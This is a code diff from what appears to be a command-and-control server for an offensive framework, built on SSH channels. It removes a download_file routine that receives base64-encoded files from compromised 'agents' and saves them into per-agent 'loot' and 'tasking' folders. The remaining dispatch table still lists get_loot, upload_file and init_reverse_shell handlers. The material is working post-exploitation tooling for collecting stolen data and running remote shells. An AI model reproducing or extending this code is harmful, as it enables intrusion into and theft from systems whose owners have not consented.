@@ -13,8 +13,8 @@ pClientDat data;
 
 transport_t transport_api = {
     send_ok, send_err, listen, read, write,
-    download_file, get_loot, upload_file, 
-    init_reverse_shell, determine_handler, init, end, nullptr, 
+    get_loot, upload_file, init_reverse_shell, 
+    determine_handler, init, end, nullptr, 
     get_data, get_name, get_id
 };
 
@@ -218,99 +218,6 @@ int upload_file(char *ptr, int is_module){
     }
     free(file_data);
     free(enc_data);
-
-    return 0;
-}
-
-/*Downloads file from connected entity*/
-int download_file(char *ptr, int is_manager, char *extra){
-    int rc = 0;
-    size_t size = 0;
-    size_t size_e = 0;
-    const char *data_ptr;
-    unsigned char *enc_ptr;
-    char buff[BUFSIZ*2];
-    char tmpbuffer[256];
-    char logbuff[BUFSIZ];
-    FILE *file;
-
-
-    rc = ssh_channel_write(channel, "ok", 3);
-    if(rc == SSH_ERROR){
-        printf("%s: Caught channel error: %s\n", data->id, ssh_get_error(session));
-        return 1;
-    }
-
-    memset(tmpbuffer, 0, sizeof(tmpbuffer));
-    rc = ssh_channel_read(channel, tmpbuffer, sizeof(tmpbuffer), 0);
-    if(rc == SSH_ERROR){
-        printf("%s: Caught channel error: %s\n", data->id, ssh_get_error(session));
-        return 1;
-    }
-
-    size = atoi(tmpbuffer);
-    data_ptr = (const char *)malloc(size+1);
-    memset((void*)data_ptr, 0, size+1);
-            
-    // writes file size
-    rc = ssh_channel_write(channel, "ok", 3);
-    if(rc == SSH_ERROR){
-        printf("%s: Caught channel error: %s\n", data->id, ssh_get_error(session));
-        return 1;
-    }
-    printf("%lu\n", size);
-    size_t tmpint = 0;
-    while (tmpint < size)
-    {
-        rc = ssh_channel_read(channel, (void *)data_ptr+strlen(data_ptr), size-tmpint, 0);
-        if(rc == SSH_ERROR){
-            printf("%s: Caught channel error: %s\n", data->id, ssh_get_error(session));
-            return 1;
-        }
-        tmpint += rc;
-    
-    }
-    
-
-    size_e = B64::dec_size(data_ptr);
-
-    enc_ptr = (unsigned char *)malloc(size_e);
-    if(!B64::decode(data_ptr, enc_ptr, size_e)){
-        printf("%s: Failed to decode data\n", data->id);
-        free((void*)data_ptr);
-        free(enc_ptr);
-        rc = ssh_channel_write(channel, "er", 3);
-        if(rc == SSH_ERROR){
-            printf("%s: Caught channel error: %s\n", data->id, ssh_get_error(session));
-            return 1;
-        }
-        return 1;
-    }
-    free((void*)data_ptr);
-            
-    // writes file 
-    rc = ssh_channel_write(channel, "ok", 3);
-    if(rc == SSH_ERROR){
-        printf("%s: Caught channel error: %s\n", data->id, ssh_get_error(session));
-        return 1;
-    }
-
-    memset(buff, 0, sizeof(buff));
-    memset(tmpbuffer, 0, sizeof(tmpbuffer));
-    if(is_manager){
-        sprintf(buff, "%s/agents/%s/tasking/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), extra, ptr);
-    } else {
-        sprintf(buff, "%s/agents/%s/loot/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), data->id, ptr);
-    }
-    printf("%s\n", buff);
-    file = fopen(buff, "wb");
-    if(file == NULL){
-        perror("");
-        return 1;
-    }
-    fwrite(enc_ptr, 1, size_e, file);
-    fclose(file);
-    free(enc_ptr);
 
     return 0;
 }
